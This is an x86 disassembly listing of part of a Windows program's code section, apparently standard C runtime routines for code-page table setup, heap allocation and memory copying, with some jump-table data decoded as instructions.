  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
